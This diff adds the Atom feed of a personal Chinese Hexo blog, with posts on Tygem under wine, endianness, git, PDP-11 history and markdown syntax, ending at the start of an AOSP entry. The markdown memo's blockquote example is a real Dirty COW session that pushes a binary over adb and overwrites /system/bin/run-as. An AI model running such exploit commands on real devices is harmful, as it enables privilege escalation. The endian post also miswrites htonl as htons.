@@ -1,0 +1,661 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>T1h0can的博客</title>
+  
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="https://t1h0can.github.io/"/>
+  <updated>2016-12-18T13:18:43.000Z</updated>
+  <id>https://t1h0can.github.io/</id>
+  
+  <author>
+    <name>T1h0can</name>
+    <email>19950529zz@gmail.com</email>
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>manjaro linux 安装弈城围棋客户端</title>
+    <link href="https://t1h0can.github.io/2016/12/18/tygem/"/>
+    <id>https://t1h0can.github.io/2016/12/18/tygem/</id>
+    <published>2016-12-18T13:06:52.000Z</published>
+    <updated>2016-12-18T13:18:43.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>最近突然想下围棋好久没下也不知道现在自己是什么水平，注册了一个弈城号从18k打起，在manjaro linux上用wine运行弈城客户端，中文版有时莫名强退，英文版干脆打不开，下面是英文版客户端的解决方法：</p>
+<ul>
+<li>sudo pacman -S winetricks</li>
+<li>winetricks mfc42<br>-wine TygemGlobalSetup.exe</li>
+</ul>
+<p>我记得十年前老师说弈城上水平很高，弈城段位+2一般是现实段位，结果我从18k开始每次两级连升，现在达到3d，依然有胜有负，目测还有机会升上4d，网上搜了一下现在的水平已经变成弈城段位-2是现实水平。。。世风日下啊。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;最近突然想下围棋好久没下也不知道现在自己是什么水平，注册了一个弈城号从18k打起，在manjaro linux上用wine运行弈城客户端，中文版有时莫名强退，英文版干脆打不开，下面是英文版客户端的解决方法：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;sudo pacman -S winet
+    
+    </summary>
+    
+    
+      <category term="备忘" scheme="https://t1h0can.github.io/tags/%E5%A4%87%E5%BF%98/"/>
+    
+      <category term="弈城" scheme="https://t1h0can.github.io/tags/%E5%BC%88%E5%9F%8E/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>大尾端，小尾端及互相转换</title>
+    <link href="https://t1h0can.github.io/2016/12/01/big-n-little-endian-n-hton/"/>
+    <id>https://t1h0can.github.io/2016/12/01/big-n-little-endian-n-hton/</id>
+    <published>2016-12-01T00:15:23.000Z</published>
+    <updated>2016-12-11T01:54:15.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="大小尾端"><a href="#大小尾端" class="headerlink" title="大小尾端"></a>大小尾端</h1><p>尾端也叫端序或字节顺序，是计算机数据存储的一种模式，分为大尾端和小尾端两大阵营。<br>采用大尾端的处理器有<code>Motorola 6800,  PowerPC 970</code>等，采用小尾端的最常见的就是目前PC的主流架构<code>X86</code>，还有一些处理器是大小尾端可配置的，如手机端的<code>ARM</code>。</p>
+<h2 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h2><p>尾端的英文单词是<code>endian</code>，源自于格列夫游记中吃鸡蛋时打破大端的(big-end)和打破小端的(little-end)两派，形象的区分了两者。</p>
+<a id="more"></a>
+<h2 id="存储方式"><a href="#存储方式" class="headerlink" title="存储方式"></a>存储方式</h2><p>大尾端机器数据的存储方向和一般的阅读方向相同，从左往右，数据的高位在低地址。<br>小尾端与之相反，数据低位在低地址。</p>
+<p>其实上面都是废话，引用微信公众号“Linux爱好者”发的一篇有关端序的文章里的配图就能解释清一切<br><img src="/assets/blogimg/endian.jpg" alt="endian"></p>
+<p>运行以下C程序可以知道当前机器的默认端序：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> c = <span class="number">16</span>;</div><div class="line">	<span class="keyword">char</span> * point = (<span class="keyword">char</span> *) (&amp;c);</div><div class="line">	<span class="keyword">if</span> (* point == <span class="number">16</span>)</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"little endian\n"</span>);</div><div class="line">	<span class="keyword">else</span> &#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"big endian\n"</span>);</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%s\n"</span>, * point);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h1 id="转换"><a href="#转换" class="headerlink" title="转换"></a>转换</h1><p>在涉及到网络编程的时候，数据从我们的机器发出后，接收数据的机器的默认端序我们并不知道，为了防止16变4096的情况发生，IP协议中定义大端序为网络端序。</p>
+<p>在转换端序时会用到下面四个函数(包含在头文件netinet/in.h中):</p>
+<ul>
+<li>unsigned short int htons(unsigned short int hostshort)  //小端序无符号短整形转换为大端序</li>
+<li>unsigned long int htons(unsigned long int hostlong)        //小端序无符号长整形转换为大端序</li>
+<li>unsigned short int ntohs(unsigned short int netshort) //大端序无符号短整形转换为小端序</li>
+<li>unsigned long int ntohl(unsigned long int netlong)        //大端序无符号长整形转换为小端序</li>
+</ul>
+<p>以上四个函数返回值为对应端序的数据</p>
+<hr>
+<p>解释一下16是如何变成4096的</p>
+<p>16用十六进制表示是0x0010,小端序方式存储时数据在内存中的顺序是,假设存储这个数字的地址是从100开始的</p>
+<table>
+<thead>
+<tr>
+<th>100</th>
+<th>101</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x10</td>
+<td>0x00</td>
+</tr>
+</tbody>
+</table>
+<p>如果不经转换直接发送到大端序机器上,顺序还是</p>
+<table>
+<thead>
+<tr>
+<th>100</th>
+<th>101</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x10</td>
+<td>0x00</td>
+</tr>
+</tbody>
+</table>
+<p>但是表示的数据却是0x1000,转换成十进制数是4096</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;大小尾端&quot;&gt;&lt;a href=&quot;#大小尾端&quot; class=&quot;headerlink&quot; title=&quot;大小尾端&quot;&gt;&lt;/a&gt;大小尾端&lt;/h1&gt;&lt;p&gt;尾端也叫端序或字节顺序，是计算机数据存储的一种模式，分为大尾端和小尾端两大阵营。&lt;br&gt;采用大尾端的处理器有&lt;code&gt;Motorola 6800,  PowerPC 970&lt;/code&gt;等，采用小尾端的最常见的就是目前PC的主流架构&lt;code&gt;X86&lt;/code&gt;，还有一些处理器是大小尾端可配置的，如手机端的&lt;code&gt;ARM&lt;/code&gt;。&lt;/p&gt;
+&lt;h2 id=&quot;起源&quot;&gt;&lt;a href=&quot;#起源&quot; class=&quot;headerlink&quot; title=&quot;起源&quot;&gt;&lt;/a&gt;起源&lt;/h2&gt;&lt;p&gt;尾端的英文单词是&lt;code&gt;endian&lt;/code&gt;，源自于格列夫游记中吃鸡蛋时打破大端的(big-end)和打破小端的(little-end)两派，形象的区分了两者。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="unix环境高级编程" scheme="https://t1h0can.github.io/tags/unix%E7%8E%AF%E5%A2%83%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B/"/>
+    
+      <category term="笔记" scheme="https://t1h0can.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
+    
+      <category term="备忘" scheme="https://t1h0can.github.io/tags/%E5%A4%87%E5%BF%98/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Git命令总结备忘</title>
+    <link href="https://t1h0can.github.io/2016/11/16/git-command/"/>
+    <id>https://t1h0can.github.io/2016/11/16/git-command/</id>
+    <published>2016-11-16T03:56:43.000Z</published>
+    <updated>2016-11-17T18:06:59.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>Git——著名的开源分布式版本控制系统，2005年由林纳斯发明，最早用于管理linux内核代码。</p>
+<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="创建新仓库"><a href="#创建新仓库" class="headerlink" title="创建新仓库"></a>创建新仓库</h2><figure class="highlight dos"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">mkdir</span> dirname</div><div class="line"><span class="built_in">cd</span> dirname</div><div class="line">git init</div></pre></td></tr></table></figure>
+<a id="more"></a>
+<h2 id="克隆仓库"><a href="#克隆仓库" class="headerlink" title="克隆仓库"></a>克隆仓库</h2><p>克隆一个本地仓库</p>
+<blockquote>
+<p>git clone /path/to/repository</p>
+</blockquote>
+<p>克隆一个远端仓库</p>
+<blockquote>
+<p>git clone username@host:/path/to/repository</p>
+</blockquote>
+<p>举个从github克隆的例子</p>
+<blockquote>
+<p>git clone <a href="https://github.com/username/repository.git" target="_blank" rel="external">https://github.com/username/repository.git</a></p>
+</blockquote>
+<h1 id="工作流"><a href="#工作流" class="headerlink" title="工作流"></a>工作流</h1><p>本地仓库主要由三部分组成</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center"><strong> workspcae </strong></th>
+<th style="text-align:center">工作目录是仓库内文件的实际位置</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><strong> Index  </strong></td>
+<td style="text-align:center"><strong> 类似于缓存，临时保存文件改动 </strong></td>
+</tr>
+<tr>
+<td style="text-align:center"><strong> HEAD </strong></td>
+<td style="text-align:center"><strong> 指向最后一次提交提交结果 </strong></td>
+</tr>
+</tbody>
+</table>
+<h1 id="添加和提交"><a href="#添加和提交" class="headerlink" title="添加和提交"></a>添加和提交</h1><p>每当有文件更改,可以添加到Index:</p>
+<blockquote>
+<p>git add filename</p>
+</blockquote>
+<p>修改文件太多可以用以下命令查看当前分支与远端分支的差异:</p>
+<blockquote>
+<p>git status</p>
+</blockquote>
+<p>提交改动到HEAD:</p>
+<blockquote>
+<p>git commit -m “改动信息”</p>
+</blockquote>
+<p>此时本地更改还没有提交到远端仓库</p>
+<h1 id="推送改动"><a href="#推送改动" class="headerlink" title="推送改动"></a>推送改动</h1><p>用如下命令把改动提交到远端仓库:</p>
+<blockquote>
+<p>git push origin master</p>
+</blockquote>
+<p>此处master可以改成任何想推送的分支</p>
+<h1 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h1><p>分支是用来将特性开发绝缘开来的。在创建仓库的时候，master 是默认分支。先在其他分支上进行开发，完成后再将它们合并到主分支上。<br>创建一个叫<code>test</code>的分支，并切换过去:</p>
+<blockquote>
+<p>git checkout -b test</p>
+</blockquote>
+<p>切换回主分支:</p>
+<blockquote>
+<p>git checkout master</p>
+</blockquote>
+<p>如果新建的分支不需要了，删掉:</p>
+<blockquote>
+<p>git branch -d test</p>
+</blockquote>
+<h1 id="更新与合并"><a href="#更新与合并" class="headerlink" title="更新与合并"></a>更新与合并</h1><p>从远端下载并合并到本地仓库:</p>
+<blockquote>
+<p>git pull</p>
+</blockquote>
+<p>但是这样是不安全的，最好把pull拆分成fetch和merge两部分</p>
+<blockquote>
+<p>git fetch</p>
+</blockquote>
+<p>从远端仓库下载</p>
+<blockquote>
+<p>git merge <branch></branch></p>
+</blockquote>
+<p>合并仓库<br>合并仓库时把任意分支的内容合并到当前分支合并之前可以用以下命令先查看当前分支和要合并进来的分支有何区别:</p>
+<blockquote>
+<p>git diff <branch></branch></p>
+</blockquote>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Git——著名的开源分布式版本控制系统，2005年由林纳斯发明，最早用于管理linux内核代码。&lt;/p&gt;
+&lt;h1 id=&quot;常用命令&quot;&gt;&lt;a href=&quot;#常用命令&quot; class=&quot;headerlink&quot; title=&quot;常用命令&quot;&gt;&lt;/a&gt;常用命令&lt;/h1&gt;&lt;h2 id=&quot;创建新仓库&quot;&gt;&lt;a href=&quot;#创建新仓库&quot; class=&quot;headerlink&quot; title=&quot;创建新仓库&quot;&gt;&lt;/a&gt;创建新仓库&lt;/h2&gt;&lt;figure class=&quot;highlight dos&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;mkdir&lt;/span&gt; dirname&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; dirname&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;git init&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+    
+    </summary>
+    
+    
+      <category term="备忘" scheme="https://t1h0can.github.io/tags/%E5%A4%87%E5%BF%98/"/>
+    
+      <category term="git" scheme="https://t1h0can.github.io/tags/git/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>PDP-11</title>
+    <link href="https://t1h0can.github.io/2016/11/16/pdp11/"/>
+    <id>https://t1h0can.github.io/2016/11/16/pdp11/</id>
+    <published>2016-11-16T03:29:15.000Z</published>
+    <updated>2016-11-18T09:36:14.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>PDP-11是1970年由DEC公司推出的第一款16位小型机（美国工业协会评为“70年代最具影响力的技术产品”）。PDP系列小型机对于UNIX系统的诞生有不可忽视的功劳。1969年，AT&amp;T贝尔实验室中止Multics项目后，原项目成员转到PDP-7小型机上开发系统，最初项目名叫“UNICS”，因为PDP-7性等低下这个项目被肯·汤普逊与丹尼斯·里奇移植到PDP-11/20上，并改名为UNIX。第一版UNICS由PDP-7汇编写成，第二版UNIX由B语言和汇编混合写成，肯·汤普逊与丹尼斯·里奇1971年发明C语言后在1973年用C重写了UNIX。PDP小型机对于计算机的发展做出的贡献有通用寄存器和unibus总线,PDP汇编对于C语言也有很大影响，比如让很多人困惑的<code>i++</code>和<code>++ i</code>自加的灵感就源自于PDP。</p>
+<h2 id=""><a href="#" class="headerlink" title=""></a><a id="more"></a></h2><h2 id="说句题外话，理论上前自加性能是高于后自加的，因为后自加多出了一个步骤是复制。"><a href="#说句题外话，理论上前自加性能是高于后自加的，因为后自加多出了一个步骤是复制。" class="headerlink" title="说句题外话，理论上前自加性能是高于后自加的，因为后自加多出了一个步骤是复制。"></a>说句题外话，理论上前自加性能是高于后自加的，因为后自加多出了一个步骤是复制。</h2><p>下面那个大块头就是pdp-11,还是用纸帶的<br><img src="https://upload.wikimedia.org/wikipedia/commons/e/ee/Pdp-11-40.jpg" alt="pdp-11"></p>
+<p>今年上半年信息课的作业是写一个简单的PDP-11仿真器，一开始学了些简单的micro-11汇编，明显感觉汇编的晦涩，高级编程语言更接近人的思维习惯。虽然PDP-11已经很老了，但是它的系统设计合理，又没有现代操作系统那么复杂，一个学期写出来一个实现了24条汇编命令的Emulator收获还是挺大的。在写的过程中总是有一些不确定的想法想去实验，当时没有用git的习惯，所以大量备份了不同阶段的代码，前些时候再翻看已经分不清谁是谁的谁了，所以重新整理了一遍，找出了最终版本，加入了从文件输入(以前都是用<code>&lt;</code>把文件重定向到标准输入),已经存到了github上。</p>
+<p>如果有人感兴趣可以点<a href="https://github.com/T1h0can/pdp-11_emulator" target="_blank" rel="external">这里</a>查看，代码质量不高，见谅。</p>
+<p>要是将来在莫物理的学弟学妹们搜到了这篇文章，代码随便拿去参考，如果评分标准没有改的话这应该是10分的程度了，虽然塔基亚娜只列出了3到9分的标准，233。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;PDP-11是1970年由DEC公司推出的第一款16位小型机（美国工业协会评为“70年代最具影响力的技术产品”）。PDP系列小型机对于UNIX系统的诞生有不可忽视的功劳。1969年，AT&amp;amp;T贝尔实验室中止Multics项目后，原项目成员转到PDP-7小型机上开发系统，最初项目名叫“UNICS”，因为PDP-7性等低下这个项目被肯·汤普逊与丹尼斯·里奇移植到PDP-11/20上，并改名为UNIX。第一版UNICS由PDP-7汇编写成，第二版UNIX由B语言和汇编混合写成，肯·汤普逊与丹尼斯·里奇1971年发明C语言后在1973年用C重写了UNIX。PDP小型机对于计算机的发展做出的贡献有通用寄存器和unibus总线,PDP汇编对于C语言也有很大影响，比如让很多人困惑的&lt;code&gt;i++&lt;/code&gt;和&lt;code&gt;++ i&lt;/code&gt;自加的灵感就源自于PDP。&lt;/p&gt;
+&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;
+    
+    </summary>
+    
+    
+      <category term="C语言" scheme="https://t1h0can.github.io/tags/C%E8%AF%AD%E8%A8%80/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>markdown语法总结备忘</title>
+    <link href="https://t1h0can.github.io/2016/11/15/markdown-grammar/"/>
+    <id>https://t1h0can.github.io/2016/11/15/markdown-grammar/</id>
+    <published>2016-11-15T19:27:29.000Z</published>
+    <updated>2016-11-20T12:42:08.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>markdown基本语法防健忘备忘录。。。</p>
+<h1 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h1><h2 id="类Atx-的标题形式"><a href="#类Atx-的标题形式" class="headerlink" title="类Atx 的标题形式"></a>类Atx 的标题形式</h2><p><code>#</code>个数决定标题等级，最多六级<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"># 一级标题</div><div class="line">## 二级标题</div><div class="line">### 三级标题</div><div class="line">#### 四级标题</div><div class="line">##### 五级标题</div><div class="line">###### 六级标题</div></pre></td></tr></table></figure></p>
+<h2 id="类-Setext-的标题形式"><a href="#类-Setext-的标题形式" class="headerlink" title="类 Setext 的标题形式"></a>类 Setext 的标题形式</h2><p><code>=</code> 代表最高阶标题,<code>-</code> 代表第二阶标题,举个栗子:</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="section">一级标题</span></div><div class="line">==========</div><div class="line"><span class="section">二级标题</span></div><div class="line">-----------------</div></pre></td></tr></table></figure>
+<p>注：<code>=</code>和<code>-</code>的数量没有明确规定，随便按</p>
+<a id="more"></a>
+<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p>在markdown中， <code>&gt;</code>标记区块引用,可以在引用的每一行都加上<code>&gt;</code>，也可以偷懒只在引用的段落的第一行加上<code>&gt;</code>,举个栗子(通过adb发送脏奶牛):</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"> &gt; adb push libs/armeabi/<span class="keyword">run</span>-<span class="keyword">as</span> /data/<span class="keyword">local</span>/tmp/<span class="keyword">run</span>-<span class="keyword">as</span></div><div class="line">[100%] /data/<span class="keyword">local</span>/tmp/<span class="keyword">run</span>-<span class="keyword">as</span></div><div class="line">adb <span class="keyword">shell</span> 'chmod 777 /data/<span class="keyword">local</span>/tmp/<span class="keyword">run</span>-<span class="keyword">as</span>'</div><div class="line">adb <span class="keyword">shell</span> '/data/<span class="keyword">local</span>/tmp/dirtycow /system/bin/<span class="keyword">run</span>-<span class="keyword">as</span> /data/<span class="keyword">local</span>/tmp/<span class="keyword">run</span>-<span class="keyword">as</span>'</div><div class="line">warning: new <span class="keyword">file</span> size (9464) and <span class="keyword">file</span> old size (17944) differ</div></pre></td></tr></table></figure>
+<p>或者：</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&gt; adb push libs/armeabi/<span class="keyword">run</span>-<span class="keyword">as</span> /data/<span class="keyword">local</span>/tmp/<span class="keyword">run</span>-<span class="keyword">as</span></div><div class="line">&gt; [100%] /data/<span class="keyword">local</span>/tmp/<span class="keyword">run</span>-<span class="keyword">as</span></div><div class="line">&gt; adb <span class="keyword">shell</span> 'chmod 777 /data/<span class="keyword">local</span>/tmp/<span class="keyword">run</span>-<span class="keyword">as</span>'</div><div class="line">&gt; adb <span class="keyword">shell</span> '/data/<span class="keyword">local</span>/tmp/dirtycow /system/bin/<span class="keyword">run</span>-<span class="keyword">as</span> /data/<span class="keyword">local</span>/tmp/<span class="keyword">run</span>-<span class="keyword">as</span>'</div><div class="line">&gt; warning: new <span class="keyword">file</span> size (9464) and <span class="keyword">file</span> old size (17944) differ</div></pre></td></tr></table></figure>
+<p>注： 在引用中同样可以使用markdown的语法。</p>
+<h1 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h1><p>markdown支持有序列表和无需列表</p>
+<h2 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h2><p>无序列表使用<code>*</code>，<code>+</code>和<code>-</code>作为标记<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="bullet">* </span>hello</div><div class="line"><span class="bullet">* </span>world</div></pre></td></tr></table></figure></p>
+<p>等效于<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="bullet">+ </span>hello</div><div class="line"><span class="bullet">+ </span>world</div></pre></td></tr></table></figure></p>
+<p>或<br><figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">-<span class="ruby"> hello</span></div><div class="line">-<span class="ruby"> world</span></div></pre></td></tr></table></figure></p>
+<h2 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h2><p>有序列表的标记是阿拉伯数字+英语句点<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="bullet">1. </span>hello</div><div class="line"><span class="bullet">2. </span>world</div></pre></td></tr></table></figure></p>
+<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><p>在markdown中插入代码用<code>` </code>标记<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">`sudo apt-get update`</div></pre></td></tr></table></figure></p>
+<p>当代码中有<code>` </code>时,代码的开始和结尾用多个<code>` </code>标记<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">`` 这是一个(`) ``</div></pre></td></tr></table></figure></p>
+<h1 id="插入链接"><a href="#插入链接" class="headerlink" title="插入链接"></a>插入链接</h1><p>插入链接的形式通常是<code>[链接标题]( 链接)</code><br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[<span class="string">google</span>](<span class="link">https://www.google.com</span>)</div></pre></td></tr></table></figure></p>
+<h1 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a>插入图片</h1><p>插入图片的形式通常是<code>![图片标题](图片地址)</code>,图片的地址可以是本地地址，也可以是网上的链接<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">![<span class="string">Avatar</span>](<span class="link">/assets/blogimg/wifli.png</span>)</div></pre></td></tr></table></figure></p>
+<h1 id="强调"><a href="#强调" class="headerlink" title="强调"></a>强调</h1><p>想要强调某个关键词或者某句话时可以用<code>*</code>，<code>**</code>或<code>_</code>，<code>__</code>表示,其中<code>*</code>和<code>_</code>表示斜体，<code>**</code>和<code>__</code>表示加粗。<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">*斜体*</div><div class="line"><span class="symbol">_</span>斜体<span class="symbol">_</span></div><div class="line">**加粗**</div><div class="line"><span class="symbol">__</span>加粗<span class="symbol">__</span></div></pre></td></tr></table></figure></p>
+<h1 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h1><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="params">| left |</span> center <span class="params">| right |</span></div><div class="line"><span class="params">| :------- |</span> <span class="symbol">:----------</span>: <span class="params">|  ---------: |</span></div><div class="line"><span class="params">|左对齐 |</span> 居中   <span class="params">| 右对齐 |</span></div><div class="line"><span class="params">| aaaa  |</span> bbbb <span class="params">| cccc  |</span></div><div class="line"><span class="params">| a         |</span> b         <span class="params">| c          |</span></div></pre></td></tr></table></figure>
+<h1 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h1><p>用三个以上的星号、减号、下划线来建立一个分隔线，行内不能有其他东西，也可以在星号或是减号中间插入空格。</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">-----------------</div><div class="line"><span class="strong">_____</span><span class="strong">_____</span>_</div><div class="line"><span class="strong">*****</span><span class="strong">*****</span></div></pre></td></tr></table></figure>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;markdown基本语法防健忘备忘录。。。&lt;/p&gt;
+&lt;h1 id=&quot;标题&quot;&gt;&lt;a href=&quot;#标题&quot; class=&quot;headerlink&quot; title=&quot;标题&quot;&gt;&lt;/a&gt;标题&lt;/h1&gt;&lt;h2 id=&quot;类Atx-的标题形式&quot;&gt;&lt;a href=&quot;#类Atx-的标题形式&quot; class=&quot;headerlink&quot; title=&quot;类Atx 的标题形式&quot;&gt;&lt;/a&gt;类Atx 的标题形式&lt;/h2&gt;&lt;p&gt;&lt;code&gt;#&lt;/code&gt;个数决定标题等级，最多六级&lt;br&gt;&lt;figure class=&quot;highlight clean&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;# 一级标题&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;## 二级标题&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;### 三级标题&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;#### 四级标题&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;##### 五级标题&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;###### 六级标题&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;h2 id=&quot;类-Setext-的标题形式&quot;&gt;&lt;a href=&quot;#类-Setext-的标题形式&quot; class=&quot;headerlink&quot; title=&quot;类 Setext 的标题形式&quot;&gt;&lt;/a&gt;类 Setext 的标题形式&lt;/h2&gt;&lt;p&gt;&lt;code&gt;=&lt;/code&gt; 代表最高阶标题,&lt;code&gt;-&lt;/code&gt; 代表第二阶标题,举个栗子:&lt;/p&gt;
+&lt;figure class=&quot;highlight asciidoc&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;section&quot;&gt;一级标题&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;==========&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;section&quot;&gt;二级标题&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-----------------&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;注：&lt;code&gt;=&lt;/code&gt;和&lt;code&gt;-&lt;/code&gt;的数量没有明确规定，随便按&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="备忘" scheme="https://t1h0can.github.io/tags/%E5%A4%87%E5%BF%98/"/>
+    
+      <category term="markdown" scheme="https://t1h0can.github.io/tags/markdown/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>AOSP Marshmallow编译教程</title>
+    <link href="https://t1h0can.github.io/2016/11/13/AOSP%E7%BC%96%E8%AF%91%E6%95%99%E7%A8%8B/"/>
+    <id>https://t1h0can.github.io/2016/11/13/AOSP编译教程/</id>
+    <published>2016-11-13T08:01:02.000Z</published>
